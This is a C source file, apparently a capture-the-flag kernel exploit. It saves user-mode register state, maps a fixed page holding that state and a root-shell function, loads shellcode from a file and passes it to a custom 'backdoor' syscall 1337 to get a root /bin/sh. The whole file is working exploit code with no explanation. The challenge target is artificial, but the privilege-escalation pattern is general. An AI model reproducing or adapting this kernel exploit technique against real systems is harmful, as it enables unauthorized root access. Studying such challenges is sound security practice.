#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
    

#define SYS_BACKDOOR 1337
#define MAX_SHELLCODE_SIZE 0x1000

uint64_t user_ss , user_sp , user_cs , user_rflags;


void save_state()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_ss,ss;"
		"mov user_sp,rsp;"
		"mov user_cs,cs;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[+] State Saved");
}


static void win(){ // 0x401a35   
    puts("now you are root :) ");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
}

int main() {
    puts("START EXPLOIT!");
    save_state();

    void *addr = mmap((void *)0x1337000, 0x5000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }
    memset(addr, 0x0, 0x5000);
    puts("[!] saving save state parameters");
    uint64_t *ptr = (uint64_t *)0x1337000;

    ptr[0] = user_ss;
    ptr[1] = user_sp;
    ptr[2] = user_cs;
    ptr[3] = user_rflags;
    ptr[4] = (uint64_t) win;
    
    int fd = open("shellcode.txt", O_RDONLY);
    if (fd < 0) {
        perror("open shellcode.txt");
        return 1;
    }
    int pid = getpid();
    printf("pid :%d\n" ,pid);
    uint8_t *shellcode = malloc(MAX_SHELLCODE_SIZE);
    if (!shellcode) {
        perror("malloc");
        close(fd);
        return 1;
    }

    ssize_t total_read = 0;
    while (1) {
        ssize_t n = read(fd, shellcode + total_read, MAX_SHELLCODE_SIZE - total_read);
        if (n < 0) {
            perror("read");
            free(shellcode);
            close(fd);
            return 1;
        }
        if (n == 0) break;
        total_read += n;
    }
    close(fd);

    if (total_read == 0) {
        fprintf(stderr, "Shellcode file is empty\n");
        free(shellcode);
        return 1;
    }
    puts("[!] syscall 1337");
    long ret = syscall(SYS_BACKDOOR, shellcode, total_read);
    if (ret < 0) {
        perror("backdoor syscall failed");
        free(shellcode);
        return 1;
    }

    printf("Backdoor syscall returned %ld\n", ret);

    free(shellcode);
    return 0;
}

